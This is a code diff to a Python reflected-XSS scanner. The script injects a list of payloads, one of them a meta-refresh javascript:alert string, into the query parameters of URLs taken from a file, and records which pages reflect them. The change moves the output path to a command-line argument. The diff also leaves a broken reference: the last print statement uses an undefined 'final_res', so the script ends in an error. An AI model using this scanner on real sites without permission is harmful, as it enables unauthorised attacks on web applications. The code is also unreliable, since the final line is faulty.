@@ -41,27 +41,30 @@ payloads = [
     "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">"
 ]
 
-# Output file path
-output_file_path = os.path.expanduser('~/vulnweb/final_res.txt')
-
 def read_file(filepath):
     with open(filepath, 'r') as f:
         return [line.strip() for line in f]
 
-urls = read_file(sys.argv[1])  # Read URLs from the first command line argument
+if len(sys.argv) != 3:
+    print("Usage: python3 xss_scanner.py <input_urls.txt> <output_results.txt>")
+    sys.exit(1)
+
+urls_file = sys.argv[1]
+output_file = sys.argv[2]
+
+urls = read_file(urls_file)
 
 output_lock = threading.Lock()
 
 def send_req(url, payload):
     time.sleep(0.15)  # To avoid overwhelming the server
     url = url.replace("=", f"={payload}")
-
     try:
         res = requests.get(url)
         if payload in res.text:
             result = f"XSS Found at {url} with payload: {payload}"
             with output_lock:
-                with open(output_file_path, 'a') as f:
+                with open(output_file, 'a') as f:
                     f.write(result + '\n')
             print(Fore.GREEN + result + Fore.RESET)
         else:
@@ -79,4 +82,4 @@ for payload in payloads:
 for t in threads:
     t.join()
 
-print(Fore.YELLOW + "Scanning completed. Results are in final_res.txt" + Fore.RESET)
+print(Fore.GREEN + "Scanning completed. Results are in " + final_res + Fore.RESET)
